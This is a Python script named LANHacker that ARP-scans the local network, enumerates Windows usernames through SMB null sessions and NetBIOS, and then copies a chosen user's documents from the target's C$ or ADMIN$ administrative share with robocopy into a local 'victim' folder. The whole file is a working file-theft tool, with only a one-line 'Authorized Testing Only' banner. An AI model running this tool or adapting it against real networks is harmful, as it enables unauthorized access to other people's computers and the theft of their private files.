import subprocess
import socket
import ipaddress
import os
import shutil
from concurrent.futures import ThreadPoolExecutor
import requests
from scapy.all import ARP, Ether, srp
import re
import time

class LANHacker:
    def __init__(self):
        self.local_ip = self.get_local_ip()
        self.network = self.get_network()
        self.devices = {}
        self.project_base = "pentest_projects"
        os.makedirs(self.project_base, exist_ok=True)
    
    def get_local_ip(self):
        """Get local IP address"""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()
    
    def get_network(self):
        """Get local network range"""
        ip = ipaddress.IPv4Address(self.local_ip)
        network = ipaddress.IPv4Network(f"{self.local_ip}/24", strict=False)
        return str(network)
    
    def get_wifi_info(self):
        """Get WiFi information and version"""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                  capture_output=True, text=True, check=True)
            wifi_info = {}
            lines = result.stdout.split('\n')
            for line in lines:
                if 'SSID' in line and ':' in line:
                    wifi_info['SSID'] = line.split(':')[1].strip()
                if 'Radio type' in line:
                    wifi_info['Standard'] = line.split(':')[1].strip()
                if 'Channel' in line:
                    wifi_info['Channel'] = line.split(':')[1].strip()
                if 'Signal' in line:
                    wifi_info['Signal'] = line.split(':')[1].strip()
            return wifi_info
        except:
            return {"Error": "Windows netsh failed - run as admin"}
    
    def arp_scan(self, ip_range):
        """Scan network using ARP requests"""
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        return answered_list
    
    def get_hostnames(self, ip):
        """Try to resolve hostname and check common services"""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "Unknown"
        
        username_info = self.extract_usernames(ip)
        return {
            'ip': ip,
            'mac': '',
            'hostname': hostname,
            'usernames': username_info
        }
    
    def extract_usernames(self, ip):
        """Extract usernames from SMB/NetBIOS"""
        usernames = []
        try:
            # SMB null session username enum
            cmd = f"nmap -sV --script=smb-enum-users -p445 {ip} --script-args smbusername=,smbpassword= 2>nul"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if "Users:" in result.stdout:
                user_matches = re.findall(r'([a-zA-Z0-9_-]+(?:\\|$))', result.stdout)
                usernames.extend(user_matches)
        except:
            pass
        
        # NetBIOS name resolution
        try:
            cmd = f"nbtstat -A {ip} 2>nul"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            if "User" in result.stdout:
                user_match = re.search(r'<00>\s+UNIQUE\s+Active\s+(.+?)\s+<', result.stdout)
                if user_match:
                    usernames.append(user_match.group(1).strip())
        except:
            pass
        
        return list(set(usernames)) if usernames else ["Unknown"]
    
    def scan_network(self):
        """Full network scan"""
        print("🔍 Scanning WiFi info...")
        wifi = self.get_wifi_info()
        print(f"WiFi SSID: {wifi.get('SSID', 'N/A')}")
        print(f"WiFi Standard: {wifi.get('Standard', 'N/A')}")
        print(f"Signal: {wifi.get('Signal', 'N/A')}")
        print(f"\n🌐 Scanning LAN network: {self.network}")
        
        devices = []
        answered = self.arp_scan(self.network)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(self.get_hostnames, received.psrc) 
                      for sent, received in answered]
            
            for future in futures:
                try:
                    device = future.result(timeout=10)
                    devices.append(device)
                    print(f"Found: {device['ip']} - Host: {device['hostname']} - Users: {', '.join(device['usernames'])}")
                    self.devices[device['ip']] = device
                except:
                    pass
        
        return devices
    
    def interactive_hack(self):
        """Interactive target selection and file extraction"""
        if not self.devices:
            print("No devices found. Run scan first.")
            return
        
        print("\n🎯 Available Targets:")
        for i, (ip, device) in enumerate(self.devices.items(), 1):
            print(f"{i}. {ip} ({device['hostname']}) - Users: {', '.join(device['usernames'][:2])}...")
        
        # Fixed input validation
        while True:
            try:
                choice_input = input("\nEnter target NUMBER (1-{}): ".format(len(self.devices))).strip()
                choice = int(choice_input) - 1
                if 0 <= choice < len(self.devices):
                    break
                else:
                    print(f"Invalid choice. Enter number between 1-{len(self.devices)}")
            except ValueError:
                print("Enter a valid NUMBER only!")
        
        target_ip = list(self.devices.keys())[choice]
        target_device = self.devices[target_ip]
        
        print(f"\n📱 Target Selected: {target_ip}")
        print(f"Hostname: {target_device['hostname']}")
        print(f"Known Users: {', '.join(target_device['usernames'])}")
        
        username = input("\nEnter target username: ").strip()
        if not username:
            username = target_device['usernames'][0] if target_device['usernames'][0] != "Unknown" else "Administrator"
        
        target_path = input("Enter target path (ex: C:/Users/ben/Documents) [default: C:/Users/{}/Documents]: ".format(username)).strip()
        if not target_path:
            target_path = f"C:/Users/{username}/Documents"
        
        print(f"\n🎯 Final Target: {target_ip}")
        print(f"👤 Username: {username}")
        print(f"📁 Path: {target_path}")
        
        confirm = input("Confirm extraction? (y/N): ").lower().strip()
        if confirm in ['y', 'yes']:
            self.extract_files(target_ip, username, target_path)
        else:
            print("Cancelled.")
    
    def extract_files(self, target_ip, username, target_path):
        """Extract files using SMB (requires admin rights on target)"""
        victim_folder = os.path.join(self.project_base, f"{username}_{target_ip.replace('.','_')}")
        os.makedirs(victim_folder, exist_ok=True)
        
        print(f"\n📂 Project folder: {victim_folder}")
        print(f"🎯 Extracting from: {target_path}")
        
        # Test SMB connectivity first
        print("🔍 Testing SMB connectivity...")
        test_cmd = f'dir \\\\{target_ip}\\C$ 2>nul'
        result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode != 0:
            print("❌ SMB Admin share access denied!")
            print("Solutions:")
            print("1. Run CMD as Administrator")
            print("2. Target has admin rights enabled")
            print("3. SMB port 445 open")
            print("4. Firewall allows SMB")
            return
        
        # SMB copy using robocopy (Windows admin shares)
        share_paths = [
            f"\\\\{target_ip}\\C$\\{target_path.replace('C:/', '').replace('/', '\\')}",
            f"\\\\{target_ip}\\ADMIN$\\Users\\{username}\\{target_path.split('/')[-2] if '/' in target_path else ''}"
        ]
        
        for i, share_path in enumerate(share_paths, 1):
            print(f"\n📥 Attempt {i}: {share_path}")
            if os.path.exists(share_path):
                cmd = f'robocopy "{share_path}" "{victim_folder}" /MIR /R:1 /W:1 /NP /LOG+:"{victim_folder}\\transfer.log"'
                print(f"Running: robocopy ...")
                result = subprocess.run(cmd, shell=True, capture_output=False)
                if os.path.exists(victim_folder) and os.listdir(victim_folder):
                    print(f"✅ SUCCESS! Files extracted to: {victim_folder}")
                    print(f"📋 Transfer log: {victim_folder}\\transfer.log")
                    return
            else:
                print(f"❌ Path not accessible: {share_path}")
        
        print("❌ Extraction failed. Check target permissions and path.")
    
    def run(self):
        """Main execution"""
        print("🚀 LAN Pentest Tool - Authorized Testing Only")
        print(f"Local IP: {self.local_ip}")
        print("-" * 60)
        
        self.scan_network()
        
        if self.devices:
            self.interactive_hack()
        else:
            print("No devices found for testing.")

if __name__ == "__main__":
    # Install requirements: pip install scapy requests
    hacker = LANHacker()
    hacker.run()